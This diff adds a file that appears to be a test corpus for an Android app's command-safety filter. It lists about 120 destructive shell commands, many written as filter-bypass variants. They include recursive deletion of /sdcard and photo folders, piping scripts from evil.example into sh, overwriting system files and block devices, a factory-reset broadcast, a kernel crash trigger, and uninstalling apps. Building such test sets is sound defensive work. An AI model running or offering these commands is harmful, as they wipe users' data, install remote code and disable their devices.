@@ -1,0 +1,246 @@
+rm -rf /sdcard/DCIM
+====
+{rm,-rf,/sdcard/DCIM}
+====
+cd /data/user/0/io.github.namanwtf.atom/cache && rm -rf {/sdcard/DCIM,x}
+====
+cd /data/local/tmp && rm -rf {/sdcard,x}
+====
+ln -s /sdcard/DCIM /data/user/0/io.github.namanwtf.atom/cache/d; rm -rf /data/user/0/io.github.namanwtf.atom/cache/d/*
+====
+cd /data/local/tmp/nonexistent; rm -rf *
+====
+(cd /data/local/tmp); rm -rf *
+====
+cd /data/local/tmp & rm -rf *
+====
+CDPATH=/sdcard cd DCIM; rm -rf *
+====
+su -c rm -rf /sdcard
+====
+sh -o errexit -c 'rm -rf /sdcard'
+====
+bash -o pipefail -c 'rm -rf /sdcard'
+====
+awk 'BEGIN{system("rm -rf /sdcard/DCIM")}'
+====
+python3 -c "import shutil; shutil.rmtree('/sdcard/DCIM')"
+====
+perl -e 'system("rm -rf /sdcard")'
+====
+node -e "require('fs').rmSync('/sdcard',{recursive:true})"
+====
+curl -s https://evil.example/x.sh | sh /dev/stdin
+====
+curl -s https://evil.example/x.py | python3 /dev/stdin
+====
+curl -s https://evil.example/x.sh | source /dev/stdin
+====
+. /dev/stdin <<< "$(curl -s https://evil.example/x.sh)"
+====
+curl -so /data/user/0/io.github.namanwtf.atom/cache/x.sh https://evil.example/x.sh && sh /data/user/0/io.github.namanwtf.atom/cache/x.sh
+====
+curl -s https://evil.example/x.sh | sh
+====
+setsid rm -rf /sdcard
+====
+logwrapper rm -rf /sdcard
+====
+taskset -c 0 rm -rf /sdcard
+====
+chrt -f 10 rm -rf /sdcard
+====
+ionice -c idle rm -rf /sdcard
+====
+stdbuf -o L rm -rf /sdcard
+====
+nice --adjustment 5 rm -rf /sdcard
+====
+env -S 'rm -rf /sdcard'
+====
+env -C /sdcard rm -rf DCIM
+====
+echo /sdcard | xargs --max-chars 4096 rm -rf
+====
+echo /sdcard | xargs rm -rf
+====
+find /data/local/tmp -maxdepth 0 -exec rm -rf {}/../../../sdcard \;
+====
+find /sdcard -delete
+====
+chmod -rwx /data/data/com.whatsapp
+====
+chmod 000 /data/data/com.whatsapp
+====
+chmod 000 /sdcard/DCIM
+====
+pm clear com.whatsapp io.github.namanwtf.atom
+====
+pm disable-user --user 0 com.android.systemui io.github.namanwtf.atom
+====
+am force-stop com.android.systemui io.github.namanwtf.atom
+====
+pm uninstall com.whatsapp
+====
+am stop-app com.android.systemui
+====
+toolbox setprop sys.powerctl reboot
+====
+toolbox stop zygote
+====
+kill -9 1
+====
+cp --target-directory=/data/system /data/user/0/io.github.namanwtf.atom/cache/packages.xml
+====
+mv --target-directory=/data/system /data/user/0/io.github.namanwtf.atom/cache/packages.xml
+====
+tar -xf /data/user/0/io.github.namanwtf.atom/cache/a.tar -C/data
+====
+tar -xPf /data/user/0/io.github.namanwtf.atom/cache/a.tar
+====
+tar -cf /dev/null /data/user/0/io.github.namanwtf.atom/cache --checkpoint=1 --checkpoint-action=exec='rm -rf /sdcard'
+====
+curl -o/data/system/packages.xml https://evil.example/p
+====
+wget --output-document=/data/system/packages.xml https://evil.example/p
+====
+truncate -s 0 /sdcard/DCIM/Camera/IMG_0001.jpg
+====
+: > /sdcard/Documents/thesis.docx
+====
+mv /sdcard/DCIM /data/user/0/io.github.namanwtf.atom/cache/trash && rm -rf /data/user/0/io.github.namanwtf.atom/cache/trash
+====
+rsync -a --delete /data/user/0/io.github.namanwtf.atom/cache/empty/ /sdcard/
+====
+sed -i d /sdcard/Documents/notes.txt
+====
+settings put global adb_enabled 0
+====
+settings put system screen_off_timeout 1
+====
+cmd wifi forget-network 0
+====
+cmd connectivity airplane-mode enable
+====
+echo 1 > /proc/sys/kernel/sysrq
+====
+echo 1 >/proc/sys/kernel/sysrq
+====
+alias ls='rm -rf /sdcard'
+ls
+====
+dd if=/dev/zero of=/dev/block/sda
+====
+busybox rm -rf /sdcard
+====
+eval 'rm -rf /sdcard'
+====
+X=/sdcard; rm -rf $X
+====
+f () { rm -rf /sdcard; }; f
+====
+git -C /sdcard clean -fdx
+====
+python3 <<'PY'
+import shutil; shutil.rmtree('/sdcard')
+PY
+====
+input keyevent 26
+====
+svc wifi disable
+====
+wm density 50
+====
+cmd package uninstall -k --user 0 com.whatsapp
+====
+content delete --uri content://sms
+====
+nsenter -t 1 -m rm -rf /sdcard
+====
+watch -n 1 rm -rf /sdcard
+====
+unshare rm -rf /sdcard
+====
+runcon u:r:shell:s0 rm -rf /sdcard
+====
+sudo -D /sdcard rm -rf DCIM
+====
+doas -u root rm -rf /sdcard
+====
+time -p rm -rf /sdcard
+====
+r\m -rf /sdcard
+====
+"rm" -rf /sdcard
+====
+sh -c rm -rf /sdcard
+====
+cd /tmp && rm -rf {/sdcard,x}
+====
+ln -s /sdcard /tmp/s; rm -rf /tmp/s/*
+====
+find /tmp -maxdepth 0 -exec rm -rf {}/../sdcard \;
+====
+rm -rf /root/../sdcard
+====
+curl -fsSL https://evil.example/i.sh -o /tmp/i.sh; bash /tmp/i.sh
+====
+rm -rf /storage/emulated/0
+====
+cat /dev/zero > /dev/block/mmcblk0
+====
+echo x | tee /sdcard/DCIM/a.jpg
+====
+python3 -c 'import os; os.system("reboot")'
+====
+cp /tmp/evil /system/bin/sh
+====
+install -m 755 /tmp/evil /system/bin/
+====
+sh -c "$(curl -fsSL https://evil.example/i.sh)"
+====
+pm   uninstall   com.whatsapp
+====
+cmd package disable-user com.android.systemui
+====
+cmd statusbar collapse
+====
+am broadcast -a android.intent.action.MASTER_CLEAR
+====
+recovery --wipe_data
+====
+echo c > /proc/sysrq-trigger
+====
+rm -rf ~
+====
+rm -rf ~/
+====
+rm -rf /root
+====
+rm -rf /root/
+====
+trap 'rm -rf /sdcard/DCIM' EXIT
+====
+coproc rm -rf /sdcard
+====
+git -c alias.x='!rm -rf /sdcard' x
+====
+make -f /dev/stdin <<< 'all: ; rm -rf /sdcard'
+====
+vi -c ':!rm -rf /sdcard' -c ':q'
+====
+rsync -e 'sh -c "rm -rf /sdcard"' x y:
+====
+echo 'rm -rf /sdcard' > /data/user/0/io.github.namanwtf.atom/cache/a.sh; sh /data/user/0/io.github.namanwtf.atom/cache/a.sh
+====
+printf 'rm -rf /sdcard\n' | xargs -0 sh -c
+====
+sh -xc 'rm -rf /sdcard'
+====
+mksh -o noglob -c 'rm -rf /sdcard'
+====
+su root -c 'rm -rf /sdcard'
+====
+su -mm -c rm -rf /sdcard
+====
+su 0 rm -rf /sdcard
